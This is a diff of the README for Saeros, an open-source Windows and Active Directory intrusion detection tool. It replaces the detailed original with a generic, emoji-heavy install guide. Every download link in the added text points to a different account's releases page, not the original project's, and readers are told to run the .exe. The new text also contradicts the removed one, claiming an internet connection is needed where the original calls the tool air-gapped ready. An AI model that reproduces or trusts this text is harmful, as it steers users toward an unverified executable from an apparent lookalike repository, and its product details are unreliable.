@@ -1,108 +1,70 @@
-<h1 align="center">
-  <img src="https://github.com/user-attachments/assets/f8736a10-7ee4-4f29-ad3d-b8891843cae7" height="128" width="128" alt="Logo" />
-  <br />
-  Saeros
-</h1>
+# 🚨 Saeros - Your Shield Against Digital Threats
 
-<div>
-  <h2 align="center">An open source HIDS tailored for Microsoft Windows and Active Directory</h2>
-  <p align="center">Enrich your SIEM for threat intelligence, forensics and UEBA (User & entity behavior analytics).</p>
-</div>
+## 🛡️ Description
+Saeros is an open-source Host Intrusion Detection System (HIDS) designed specifically for Microsoft Windows and Active Directory environments. It helps you monitor, detect, and respond to potential security threats. With Saeros, you can strengthen your security posture and protect your organization from cyber risks.
 
-<table>
-  <tr>
-    <td valign="top"><img src="https://github.com/user-attachments/assets/2650ccea-c4b1-4581-86d3-9fbd48fd45f0"/></td>
-    <td valign="top"><img src="https://github.com/user-attachments/assets/e4b655ec-2a27-443e-9cf6-1a167f649e0d"/></td>
-    <td valign="top"><img src="https://github.com/user-attachments/assets/04a9c3d8-68cb-4157-a646-184ad27abfb8"/></td>
-  </tr>
-</table>
+## 📦 Download Now
+[![Download Saeros](https://img.shields.io/badge/Download%20Saeros-latest-blue.svg)](https://github.com/Marwadel/Saeros/releases)
 
-## Purpose
+## 🚀 Getting Started
+Follow these steps to get Saeros running on your Windows machine:
 
-Saeros is neither a SIEM nor an EDR. Instead, it sits between the two, delivering the contextual insights that most platforms overlook. Its purpose is to detect common user behaviors that could indicate data exfiltration, infiltration, malware activity, or other malicious or suspicious actions.
+1. **Visit the Download Page**  
+   Click the link below to go to the releases page where you can download the software.  
+   [Download Saeros from Releases](https://github.com/Marwadel/Saeros/releases)
 
-## Key takeaways
+2. **Select the Latest Release**  
+   On the Releases page, find the latest version of Saeros. The most recent version will typically be listed at the top.
 
-- **High-performance processing**: Ingests **tens of thousands of Windows Event Logs per second** with minimal CPU usage.
-- **Low bandwidth footprint**: Executes detection logic **locally on each host**, sending only matched detections over gRPC.
-- **Automatic audit policy management**: **Dynamically configures audit policies** based on the rules you enable.
-- **Extensive ruleset**: Ships with **thousands of curated Sigma rules** from the official [Sigma](https://github.com/SigmaHQ/sigma) repository.
-- **Customizable rules**: Modify any rule at runtime to **fit your environment and requirements**.
-- **Flexible detection exclusions**: **Exclude detections** using one or multiple event properties.
-- **Powerful integrations**: Forward detections directly to **ElasticSearch**.
-- **MITRE ATT&CK visibility**: Explore detection coverage by **tactic**, **technique**, or **sub-technique**.
-- **Effortless AD deployment**: Install agents on **domain controllers with a single click**.
-- **Air-gapped ready**: Fully operational **without internet access**.
-- **Zero external dependencies**: Requires **no DBMS or third-party components**.
-- **Fast, simple installation**: Get started in **just a few clicks**.
+3. **Download the Installer**  
+   Click on the installer file to start the download. The file will usually have an `.exe` extension. This is the setup file you will need to run the program on your computer.
 
-### Use cases
+4. **Locate the Downloaded File**  
+   Once the download is complete, navigate to the folder where your downloads are saved. This is often the "Downloads" folder in your user profile.
 
-Saeros can detect thousands of suspicious activities, including:
+5. **Run the Installer**  
+   Double-click the downloaded `.exe` file. You may see a security prompt asking if you want to run the software. Click "Run" to proceed.
 
-- Repeated failed logon attempts (password-guessing attacks)
-- Sudden spikes in network traffic from a single process (data exfiltration)
-- Remote logins originating from public IP addresses (lateral movements)
-- Users being created or added to sensitive user groups (privilege escalation)
-- Event logs being cleared (defense evasion)
+6. **Follow the Installation Instructions**  
+   The installer will guide you through the setup process. Follow the on-screen prompts to install Saeros on your computer.
 
-## Installation
+7. **Launch Saeros**  
+   After installation, find Saeros in your program menu or on your desktop. Double-click the icon to launch the application.
 
-Saeros is quick and straightforward to install. Download Saeros-Setup.exe from the [Releases](https://github.com/Saeros-Security/Saeros/releases/tag/v1.0.0) page and follow the guided setup.
+## ⚙️ System Requirements
+To run Saeros effectively, make sure your computer meets the following requirements:
 
-## Deployment
+- **Operating System:** Microsoft Windows 10 or later
+- **Processor:** Dual-core processor or better
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** Minimum of 250 MB available hard drive space
+- **Network:** Internet connection for updates and to check for new features
 
-Saeros can be deployed on a standalone Microsoft Windows endpoint and across Microsoft Active Directory domains. The setup installs two Windows services and a desktop application.
+## 🛠️ Features
+Saeros comes packed with tools and features that enhance your security:
 
-**Saeros Collector (Agent)** – A Windows service that starts automatically with the system. It configures audit policies, subscribes to ETW channels, performs Sigma rule matching, and forwards detections to the *Bridge*. For simplicity, this service is referred to as the *Agent*. It usually sits on a standalone Windows workstation or on domain controllers.
+- **Real-Time Monitoring:** Keep an eye on Windows Event Logs and detect suspicious activities in real time.
+- **Incident Response:** Quickly respond to potential threats with built-in incident response tools.
+- **Forensics Capabilities:** Analyze security events to understand how an incident occurred and who was involved.
+- **Custom Alerts:** Set up alerts for specific events or actions that you want to be notified about.
+- **Integration with Sigma Rules:** Use Sigma rules to create custom detection methods tailored to your environment.
 
-**Saeros Collector (Bridge)** – A Windows service that also starts automatically with the system. It communicates with the *Agent*, manages Sigma rule configuration, stores detections in a local SQLite database, and forwards them to configured SIEMs. The *Bridge* exposes an API consumed by the *Console*. It usually sits on the local installation (where the installer was run).
+## 🔍 Explore More
+If you want to dive deeper into what Saeros can do, check out our documentation in the repository. It provides extensive information on how to configure and utilize the software effectively.
 
-**Saeros Console** – A Windows desktop application used to manage Sigma rules and exclusions, browse detections, configure integrations, and deploy collectors to Active Directory domains. It usually sits on the local installation (where the installer was run).
+## 📞 Get Help
+If you encounter any issues or have questions about Saeros, feel free to reach out. You can find support through the community forum linked in the repository or submit an issue on GitHub.
 
----
+## 📝 Contributing
+Saeros is an open-source project, and we welcome contributions. If you're interested in helping improve Saeros, visit the contribution guidelines in the repository to learn how you can get involved.
 
-### Non Domain-Joined Environment
+## 💡 Tips for Usage
+- Regularly check for updates to ensure you have the latest features and security improvements. You can find updates on the same releases page.
+- Consider configuring alerts that are most relevant to your organization’s security needs. This will ensure you only receive notifications that matter to you.
 
-In a non domain-joined (standalone) environment, the installer deploys both services and the *Console* on the local machine. Saeros immediately begins collecting events, and detections become available in the *Console*. An *Agent* can still be deployed to a domain later to monitor domain controllers.
+## 📂 Additional Resources
+Explore additional resources and community discussions related to Saeros to enhance your understanding and implementation of the software.
 
-#### Requirements
+[Download Saeros from Releases](https://github.com/Marwadel/Saeros/releases)
 
-This is the simplest setup: no network or firewall configuration is required, and all communication occurs locally. The *Saeros Collector (Bridge)* service exposes a local HTTP endpoint and uses local gRPC communication with both the *Agent* and the *Console*.
-
----
-
-### Domain-Joined Environment
-
-In a domain-joined environment, the installer detects domain membership and can deploy an *Agent* to each domain controller during setup. Deployment occurs via a Group Policy Object (GPO). Each *Agent* forwards detections back to the primary domain controller through a gRPC named pipe, then to the local *Saeros Collector (Bridge)* service (where the installer was run).
-
-#### Requirements
-
-Deployment must be performed by a user in the **Builtin Administrators** group. The password is not stored and is used only to establish SMB/LDAP connections during deployment.
-
-The following ports must be open, and firewall rules must allow connections from the *Saeros Collector (Bridge)* service to the primary domain controller:
-
-- **TCP/445**
-- **TCP/389** (or **TCP/686** for LDAPS)
-
-Deployment creates a GPO with the following components:
-
-- Protected folder (read-only access for Authenticated Users):  
-  **C:\Windows\SYSVOL\domain\Policies\\{3560FF19-45A3-4F9A-956B-937A04D2AABF}**
-- A scheduled task that installs the *Saeros Collector (Agent)* service on domain controllers
-- The *Collector.exe* signed binary which is executed by all domain controllers as a Windows service under LocalSystem identity
-- **Audit.csv** containing required audit policies based on configured rules
-- Registry values enabling the required ETW channels
-- ADMX templates that configure PowerShell policies, including:  
-  *Include command line in process creation events*,  
-  *Configure Logon Script Delay*,  
-  *Turn on Module Logging*,  
-  *Turn on PowerShell Script Block Logging*
-
-> [!NOTE]
-> Only detections—not full event logs—are sent from the *Agent* to the *Bridge*, significantly reducing bandwidth requirements.
-
-### Diagrams
-| Non domain-joined           | Domain-joined |
-| ------------- | ------------- |
-| <img src="https://github.com/user-attachments/assets/3fbd705c-8ebc-4894-9317-59d44dc575c6" data-canonical-src="https://github.com/user-attachments/assets/3fbd705c-8ebc-4894-9317-59d44dc575c6" width="500" />  | <img src="https://github.com/user-attachments/assets/c7cb7208-03ef-4689-8804-21e3e4cb7987" data-canonical-src="https://github.com/user-attachments/assets/c7cb7208-03ef-4689-8804-21e3e4cb7987" width="500" />  |
+By following these steps, you can easily download and install Saeros on your Windows system, helping you safeguard your environment against cyber threats.
